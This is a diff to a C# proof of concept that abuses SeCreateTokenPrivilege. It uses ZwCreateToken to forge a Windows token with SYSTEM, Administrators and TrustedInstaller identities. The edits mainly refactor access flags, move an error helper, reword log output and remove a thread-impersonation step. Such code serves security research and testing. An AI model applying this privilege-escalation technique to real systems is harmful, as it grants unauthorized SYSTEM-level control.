@@ -50,6 +50,25 @@ namespace SeCreateTokenPrivilegePoC
             SidTypeComputer
         }
 
+        [Flags]
+        enum TokenAccessFlags : uint
+        {
+            TOKEN_ADJUST_DEFAULT = 0x0080,
+            TOKEN_ADJUST_GROUPS = 0x0040,
+            TOKEN_ADJUST_PRIVILEGES = 0x0020,
+            TOKEN_ADJUST_SESSIONID = 0x0100,
+            TOKEN_ASSIGN_PRIMARY = 0x0001,
+            TOKEN_DUPLICATE = 0x0002,
+            TOKEN_EXECUTE = 0x00020000,
+            TOKEN_IMPERSONATE = 0x0004,
+            TOKEN_QUERY = 0x0008,
+            TOKEN_QUERY_SOURCE = 0x0010,
+            TOKEN_READ = 0x00020008,
+            TOKEN_WRITE = 0x000200E0,
+            TOKEN_ALL_ACCESS = 0x000F01FF,
+            MAXIMUM_ALLOWED = 0x02000000
+        }
+
         enum TOKEN_INFORMATION_CLASS
         {
             TokenUser = 1,
@@ -450,7 +469,7 @@ namespace SeCreateTokenPrivilegePoC
         [DllImport("ntdll.dll")]
         static extern int ZwCreateToken(
             out IntPtr TokenHandle,
-            uint DesiredAccess,
+            TokenAccessFlags DesiredAccess,
             ref OBJECT_ATTRIBUTES ObjectAttributes,
             TOKEN_TYPE TokenType,
             ref LUID AuthenticationId,
@@ -465,7 +484,6 @@ namespace SeCreateTokenPrivilegePoC
 
         const int STATUS_SUCCESS = 0;
         const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
-        const uint TOKEN_ALL_ACCESS = 0xF00FF;
         const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
         const string TRUSTED_INSTALLER_RID = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
         const string UNTRUSTED_MANDATORY_LEVEL = "S-1-16-0";
@@ -513,40 +531,6 @@ namespace SeCreateTokenPrivilegePoC
         const byte SECURITY_STATIC_TRACKING = 0;
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
-        static string GetWin32ErrorMessage(int code, bool isNtStatus)
-        {
-            uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
-            uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
-            StringBuilder message = new StringBuilder(255);
-            IntPtr pNtdll = IntPtr.Zero;
-
-            if (isNtStatus)
-                pNtdll = LoadLibrary("ntdll.dll");
-
-            uint status = FormatMessage(
-                isNtStatus ? (FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM) : FORMAT_MESSAGE_FROM_SYSTEM,
-                pNtdll,
-                code,
-                0,
-                message,
-                255,
-                IntPtr.Zero);
-
-            if (isNtStatus)
-                FreeLibrary(pNtdll);
-
-            if (status == 0)
-            {
-                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
-            }
-            else
-            {
-                return string.Format("[ERROR] Code 0x{0} : {1}",
-                    code.ToString("X8"),
-                    message.ToString().Trim());
-            }
-        }
-
 
         static IntPtr CreateElevatedToken(TOKEN_TYPE tokenType)
         {
@@ -593,7 +577,8 @@ namespace SeCreateTokenPrivilegePoC
                 SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
             };
 
-            Console.WriteLine("[>] Trying to create an elevated token.");
+            Console.WriteLine("[>] Trying to create an elevated {0} token.",
+                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
 
             if (!ConvertStringSidToSid(
                 DOMAIN_ALIAS_RID_ADMINS,
@@ -745,7 +730,7 @@ namespace SeCreateTokenPrivilegePoC
 
             int ntstatus = ZwCreateToken(
                 out IntPtr hToken,
-                TOKEN_ALL_ACCESS,
+                TokenAccessFlags.TOKEN_ALL_ACCESS,
                 ref oa,
                 tokenType,
                 ref authId,
@@ -763,13 +748,14 @@ namespace SeCreateTokenPrivilegePoC
 
             if (ntstatus != STATUS_SUCCESS)
             {
-                Console.WriteLine("[-] Failed to create privileged token.");
+                Console.WriteLine("[-] Failed to create elevated token.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
 
                 return IntPtr.Zero;
             }
 
-            Console.WriteLine("[+] An elevated token is created successfully.");
+            Console.WriteLine("[+] An elevated {0} token is created successfully.",
+                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
 
             return hToken;
         }
@@ -843,24 +829,38 @@ namespace SeCreateTokenPrivilegePoC
         }
 
 
-        static bool ImpersonateCurrentThread(IntPtr hToken)
+        static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
-            int error;
-            Console.WriteLine("[>] Trying to set an impersonation token to current thread.");
-            Console.WriteLine("    |-> Current Thread ID : {0}", GetCurrentThreadId());
-            
-            if (!ImpersonateLoggedOnUser(hToken))
+            uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
+            uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
+            StringBuilder message = new StringBuilder(255);
+            IntPtr pNtdll = IntPtr.Zero;
+
+            if (isNtStatus)
+                pNtdll = LoadLibrary("ntdll.dll");
+
+            uint status = FormatMessage(
+                isNtStatus ? (FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM) : FORMAT_MESSAGE_FROM_SYSTEM,
+                pNtdll,
+                code,
+                0,
+                message,
+                255,
+                IntPtr.Zero);
+
+            if (isNtStatus)
+                FreeLibrary(pNtdll);
+
+            if (status == 0)
             {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to set thread token.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return false;
+                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
             }
-
-            Console.WriteLine("[+] Token impersonation is successful.");
-
-            return true;
+            else
+            {
+                return string.Format("[ERROR] Code 0x{0} : {1}",
+                    code.ToString("X8"),
+                    message.ToString().Trim());
+            }
         }
 
 
@@ -885,14 +885,6 @@ namespace SeCreateTokenPrivilegePoC
                 return;
 
             Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
-
-            if (!ImpersonateCurrentThread(hToken))
-            {
-                CloseHandle(hToken);
-
-                return;
-            }
-
             Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
             Console.ReadLine();
 
